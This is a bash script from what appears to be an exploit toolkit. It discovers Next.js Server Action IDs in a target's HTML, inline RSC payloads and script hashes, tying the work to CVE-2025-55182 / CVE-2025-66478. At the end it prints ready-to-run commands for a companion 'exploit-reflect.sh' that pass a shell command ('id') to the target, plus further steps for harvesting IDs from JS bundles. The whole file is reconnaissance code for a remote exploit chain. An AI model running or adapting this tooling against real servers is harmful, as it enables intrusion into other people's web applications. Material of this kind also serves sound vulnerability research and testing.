#!/bin/bash
# enumerate-actions.sh - Discover Server Action IDs from Next.js targets
#
# Server Action IDs are publicly exposed in Next.js applications.
# This script extracts them from HTML responses for use with exploit-reflect.sh.
#
# Discovery methods:
#   1. HTML hidden fields: $ACTION_ID_{hash} patterns
#   2. RSC Flight payload: {"id":"{hash}","bound":...} in <script> tags
#   3. JavaScript bundles: Action hashes in compiled JS (optional)
#
# Usage: ./enumerate-actions.sh [TARGET_URL]
# Example: ./enumerate-actions.sh http://localhost:3443

set -e

TARGET="${1:-http://localhost:3443}"

echo "[*] Server Action Enumeration (CVE-2025-55182 / CVE-2025-66478)"
echo "[*] Target: ${TARGET}"
echo ""

# Fetch the main page
echo "[*] Fetching ${TARGET}..."
HTML=$(curl -s -L "${TARGET}" --max-time 30)

if [[ -z "$HTML" ]]; then
    echo "[-] Failed to fetch target"
    exit 1
fi

echo "[+] Response received ($(echo "$HTML" | wc -c | tr -d ' ') bytes)"
echo ""

# Method 1: Extract $ACTION_ID_ patterns from hidden fields
echo "[*] Method 1: Searching for \$ACTION_ID_ hidden fields..."
ACTION_IDS=$(echo "$HTML" | grep -oE '\$ACTION_ID_[a-f0-9]+' | sort -u)

if [[ -n "$ACTION_IDS" ]]; then
    echo "[+] Found action IDs in HTML:"
    echo "$ACTION_IDS" | while read -r id; do
        # Strip the $ACTION_ID_ prefix to get the raw hash
        HASH=$(echo "$id" | sed 's/\$ACTION_ID_//')
        echo "    $HASH"
    done
else
    echo "[-] No \$ACTION_ID_ patterns found"
fi
echo ""

# Method 2: Extract action metadata from RSC Flight payload
echo "[*] Method 2: Searching RSC Flight payload for action metadata..."
# Look for patterns like: {"id":"hash","bound":null,"name":"actionName",...}
RSC_ACTIONS=$(echo "$HTML" | grep -oE '\{"id":"[a-f0-9]+","bound":[^}]+\}' | sort -u)

if [[ -n "$RSC_ACTIONS" ]]; then
    echo "[+] Found action metadata in RSC payload:"
    echo "$RSC_ACTIONS" | while read -r meta; do
        # Extract fields
        ID=$(echo "$meta" | grep -oE '"id":"[a-f0-9]+"' | sed 's/"id":"//;s/"//')
        NAME=$(echo "$meta" | grep -oE '"name":"[^"]+"' | sed 's/"name":"//;s/"//')
        # In dev mode, location may be present
        LOCATION=$(echo "$meta" | grep -oE '"location":\[[^\]]+\]' | head -1)

        if [[ -n "$NAME" ]]; then
            echo "    ID: $ID"
            echo "    Name: $NAME"
            if [[ -n "$LOCATION" ]]; then
                echo "    Location: $LOCATION"
            fi
            echo ""
        else
            echo "    ID: $ID (name not exposed)"
        fi
    done
else
    echo "[-] No RSC action metadata found"
fi
echo ""

# Method 3: Look for action references in inline scripts
echo "[*] Method 3: Searching inline scripts for action references..."
# Extract 40-char hex strings that look like action IDs
INLINE_HASHES=$(echo "$HTML" | grep -oE '"[a-f0-9]{40}"' | tr -d '"' | sort -u)

if [[ -n "$INLINE_HASHES" ]]; then
    # Filter to only show hashes not already found
    NEW_HASHES=""
    while read -r hash; do
        if ! echo "$ACTION_IDS" | grep -q "$hash"; then
            NEW_HASHES="${NEW_HASHES}${hash}\n"
        fi
    done <<< "$INLINE_HASHES"

    if [[ -n "$NEW_HASHES" ]]; then
        echo "[+] Additional 40-char hashes (may be action IDs):"
        echo -e "$NEW_HASHES" | grep -v '^$' | while read -r hash; do
            echo "    $hash"
        done
    else
        echo "[-] No additional hashes found"
    fi
else
    echo "[-] No inline action hashes found"
fi
echo ""

# Summary
echo "========================================"
echo "[*] Summary"
echo "========================================"

# Collect all unique action IDs
ALL_IDS=$(echo "$ACTION_IDS" | sed 's/\$ACTION_ID_//g')
if [[ -n "$RSC_ACTIONS" ]]; then
    RSC_IDS=$(echo "$RSC_ACTIONS" | grep -oE '"id":"[a-f0-9]+"' | sed 's/"id":"//;s/"//g')
    ALL_IDS=$(echo -e "${ALL_IDS}\n${RSC_IDS}" | sort -u | grep -v '^$')
fi

if [[ -n "$ALL_IDS" ]]; then
    COUNT=$(echo "$ALL_IDS" | wc -l | tr -d ' ')
    echo "[+] Total unique action IDs found: $COUNT"
    echo ""
    echo "[*] For exploit-reflect.sh, use one of these IDs:"
    echo "$ALL_IDS" | head -5 | while read -r id; do
        echo "    ./exploit-reflect.sh ${TARGET} \"$id\" \"id\""
    done

    if [[ $COUNT -gt 5 ]]; then
        echo "    ... and $((COUNT - 5)) more"
    fi
else
    echo "[-] No action IDs discovered"
    echo "[*] The target may not have any server actions, or they may be"
    echo "    dynamically loaded. Try fetching specific pages with forms."
fi
echo ""

# Suggest next steps
echo "[*] Next steps:"
echo "    1. Try fetching pages with forms: ./enumerate-actions.sh ${TARGET}/login"
echo "    2. Check JS bundles: curl -s ${TARGET}/_next/static/chunks/*.js | grep -oE '[a-f0-9]{40}'"
echo "    3. Use Network tab in browser DevTools to observe action requests"
